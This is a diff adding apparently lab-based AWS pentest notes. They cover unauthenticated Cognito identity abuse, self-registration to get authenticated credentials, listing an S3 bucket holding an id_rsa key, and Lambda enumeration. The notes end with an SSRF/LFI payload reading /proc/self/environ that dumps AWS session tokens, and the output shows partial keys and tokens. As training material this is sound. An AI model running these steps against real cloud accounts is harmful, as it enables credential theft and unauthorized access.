@@ -1628,6 +1628,152 @@ If you don't know the database password after spinning up the EC2 instance, it's
 
 ---
 
+Knowing a Cognito identity pool ID, we can request an Identity ID if it is configured to support unauthenticated identities. With the Identity ID, request credentials for it
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign
+{
+    "IdentityId": "us-east-1:6391d33c-4bb8-ca6a-0338-67c93f4d4342"
+}
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:6391d33c-4bb8-ca6a-0338-67c93f4d4342 --no-sign
+{
+    "IdentityId": "us-east-1:6391d33c-4bb8-ca6a-0338-67c93f4d4342",
+    "Credentials": {
+        "AccessKeyId": "ASIAWHEOTHRFQZSHBVZP",
+        "SecretKey": "uN6gw....
+<snip>
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nano ~/.aws/credentials
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws sts get-caller-identity --profile pwnedlabs                                                                     
+{
+    "UserId": "AROAWHEOTHRFRYHGIQFVK:CognitoIdentityCredentials",
+    "Account": "427648302155",
+    "Arn": "arn:aws:sts::427648302155:assumed-role/Cognito_StatusAppUnauth_Role/CognitoIdentityCredentials"
+}
+```
+
+In this lab, an S3 bucket name was leaked and the provided Cognito Identity Credentials grant access to it
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3 ls s3://hl-app-images/temp/ --profile pwnedlabs
+2023-07-15 14:10:54          0 
+2023-07-15 14:11:22       3428 id_rsa
+```
+
+There is also a Cognito-hosted web UI for a web app that includes the Client ID `16f1g98bfuj9i0g3f8be36kkrl`. Cognito's CLI documentation can be found <a href="https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/#cli-aws-cognito-idp">here</a>
+
+Sign up with the following command (extra points for user enumeration!)
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username test --password 'Password123!' --profile pwnedlabs --region us-east-1
+
+An error occurred (UsernameExistsException) when calling the SignUp operation: User already exists
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username bc --password 'Password123!' --profile pwnedlabs --region us-east-1  
+{
+    "UserConfirmed": false,
+    "UserSub": "78355146-8ae9-4e7d-ba57-78fb5306e198"
+}
+```
+
+We cannot login because the user is not confirmed. Pass the following arguments in a new registration command to be able to confirm the user. A 10minutemail was used for this
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username bc2 --password 'Password123!' --user-attributes Name="email",Value="ynxsdihnpqfvmcuyeo@nespj.com" Name="name",Value="Test"
+{
+    "UserConfirmed": false,
+    "CodeDeliveryDetails": {
+        "Destination": "y***@n***",
+        "DeliveryMedium": "EMAIL",
+        "AttributeName": "email"
+    },
+    "UserSub": "627bb320-e25c-491e-9b8f-41d7e33a8074"
+}
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-idp confirm-sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username bc2 --confirmation-code 140476
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-idp initiate-auth --client-id 16f1g98bfuj9i0g3f8be36kkrl --auth-flow USER_PASSWORD_AUTH --auth-parameters USERNAME=bc2,PASSWORD=Password123!
+{
+    "ChallengeParameters": {},
+    "AuthenticationResult": {
+        "AccessToken": "eyJraWQiOiJDTFRKamV3bm5sT3BXTmxzOTZhbW1veEtZaHFqMVBuWjJrMXdMVVg2bno0PSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI2MjdiYjMyMC1lMjVjLTQ5MWUtOWI4Zi00MWQ3ZTMzYTgwNzQiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV84cmNLN2FidHoiLCJjbGllbnRfaWQiOiIxNmYxZzk4YmZ1ajlpMGczZjhiZTM2a2tybCIsIm9yaWdpbl9qdGkiOiIxNGFkZWFjNy1jNjlkLTQyOTMtOTFkYy02YTE1ZTJlNWZmOTMiLCJldmVudF9pZCI6IjkyOWUzN2U1LWQ0MzEtNDdlMy1hMzI3LWYzZmNjMzA1ZjQzNyIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLm
+<snip>
+```
+
+Get a unique Identity ID and request credentials
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-identity get-id --identity-pool-id "us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367" --logins "{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<token>\" }"
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:ee941406-f70b-4ff3-8e3f-a9f2eb32454b --logins "{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<token>\" }"
+```
+
+Configure AWS credentials and proceed with typical enumeration
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws sts get-caller-identity                                        
+{
+    "UserId": "AROAWHEOTHRFZ7HQ7Z6QA:CognitoIdentityCredentials",
+    "Account": "427648302155",
+    "Arn": "arn:aws:sts::427648302155:assumed-role/Cognito_StatusAppAuth_Role/CognitoIdentityCredentials"
+}
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws iam list-role-policies --role-name Cognito_StatusAppAuth_Role
+{
+    "PolicyNames": [
+        "oneClick_Cognito_StatusAppAuth_Role_1689349464673"
+    ]
+}
+```
+
+---
+
+Below we enumerate the lambda function. Download the code with the URL at the end of the output
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws lambda get-function --function-name huge-logistics-status 
+{
+    "Configuration": {
+        "FunctionName": "huge-logistics-status",
+        "FunctionA
+<snip>
+},
+    "Code": {
+        "RepositoryType": "S3",
+        "Location": "https://prod-iad-c1-djusa-tasks.s3.us-east-1.amazonaws.com/snapshots/427648302155/huge-logistics-status-ebb6abbc-63e9-47f8-b5a3-9dfc4c2e69dc?versionId=GXaKVxYEoBEFPyPl3E9avQChcfMNvUCf&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIEMWzFWqSSr7Kth%2Bfp1WotsjyBCtJHp7vTVUduDJywDLAiEA40LBm5JRSgo%2Bg7HUHlk%2FCBCQXovGnLOUisibSODA%2BhIqiwIIbRAEGgw0NzkyMzMwMjUzNzkiDFHx6f1vBE2UHbfZDCroAbGF27zxcGWYcwzHCBpekOkSuMjVOZPWJK4MMix5gfJPUqD8fESXD0tKaIkTJdLtV5iLHt3Pp4ENn26fonpiGSk0aOHIgpefG%2Bmp4Jv9fXg1h6xPlsFcnFDbZyeRq2ycp5QF%2FquALWAZiZqZdyYhNwVQWQyM1V1w5blysI1OJexHk8NqK2RuEqGzMUsgaB5RPfzbRGT3KLPwrg6%2FAoERRyct52NpWzOeBugYkZRQqJE1eXQVtvD15ny%2BMBl7Px9snMy9akh3d20io4o1wzGm%2FPZMrpy2Tz8wmtYZ%2FHVKIIiAtK%2FnTiemszgwoIbxxwY6jQG7ETrft6DsLcUv80CNAdm2J4dd83raAJMBo6QorvlTgZr4gDmt3IfhsBOT2yS70PY7GP8oKR4pb5sW9NLPLNrAKGi%2F0Pb1FoHoC9DWWUuLsqQ7a%2FemJOyAuN62er%2F040WILelIO7Ssbrbs0EhIwvp6Xgg3FViSJ%2FhRs0x%2FU5N9vYqPh3F1yqRgHaLYLmQ%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251025T135601Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAW7FEDUVR2CBYKEDO%2F20251025%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=cca7694ded32eb02933e621dc40db8bc49b17b5279f82ea4f69a2c8010f93ea7"
+    }
+```
+
+This functions is vulnerable to an SSRF vulnerability. Exploit it with an LFI to steal credentials
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws lambda invoke --function-name huge-logistics-status --payload '{"target" : "file:///proc/self/environ"}' out.json
+{
+    "StatusCode": 200,
+    "ExecutedVersion": "$LATEST"
+}
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat out.json| grep -i 'aws'                                                                                          
+{"statusCode": null, "statusMessage": "Service is not available.", "body": "AWS_LAMBDA_FUNCTION_VERSION=$LATEST\u0000AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEL7//////////wEaCXVzLWVhc3QtMSJGMEQCIBo6Ig9pIW4/0GZXIqQqFe8lZMksInFpft0l2lpF/iPNAiBTpVu5Jc5PDY0neA/MvMM51PyahloDhlhYLRR+rxbt8Sr+Agh3EAAaDDQyNzY0ODMwMjE1NSIMFOswJW+imlKCzEu5KtsCRkq52fQ6VnI6KKlRHkN71qUcvi4I0aPvVwiHBk5mUgddp9ZVFWt8mg3Nz/nUiYIWkQ9fFwaYr/eCmfwRt6gWFumMSXLe+jY05hNT2Zp7/WzMtEuF000dGitNzyxTJ8FH6k1nA9anERf039Dobx6ifz9plkAdh5rsKv6HgCNDb8/SSOev80rk35zZHzqwccrlboQxtPwZ4/zWs6MOQxrFMBAOBfy+VBeQoRWujwCkd9NQT5y8wVInNB+wPVxarXDDjn4g3D81s/wHL6mbkqkhbKbuiJQ0/V7UAiHvgHw/tQwZDX1DpR6pMe0isYiZXQUXMJYHK/wAXV
+<snip>
+```
+
+---
+
+
+
+
 
 
 
